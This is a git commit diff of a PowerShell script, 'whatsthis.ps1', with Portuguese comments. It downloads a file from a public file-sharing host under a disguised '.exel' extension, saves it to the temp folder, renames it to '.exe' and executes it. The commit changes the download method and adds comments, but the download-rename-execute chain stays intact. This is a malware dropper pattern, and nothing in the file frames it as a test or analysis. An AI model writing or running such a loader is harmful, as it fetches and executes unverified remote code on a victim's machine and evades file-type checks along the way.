53525381514564efe69448cbc7d54362e75bfcad
hamood <71662379+tupimano@users.noreply.github.com>
2024-07-22 17:18:42 -0300

    Update whatsthis.ps1

--- whatsthis.ps1
+++ whatsthis.ps1
@@ -1,6 +1,20 @@
+# URL do arquivo
 $url = "https://files.catbox.moe/uy96rs.exel"
+
+# Caminho onde o arquivo será salvo
 $downloadPath = "$env:TEMP\uy96rs.exel"
+
+# Caminho onde o arquivo será renomeado e salvo
 $exePath = "$env:TEMP\uy96rs.exe"
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
+
+# Cria uma instância do WebClient
+$webClient = New-Object System.Net.WebClient
+
+# Baixa o arquivo
+$webClient.DownloadFile($url, $downloadPath)
+
+# Renomeia o arquivo
 Rename-Item -Path $downloadPath -NewName $exePath
+
+# Executa o arquivo
 Start-Process -FilePath $exePath
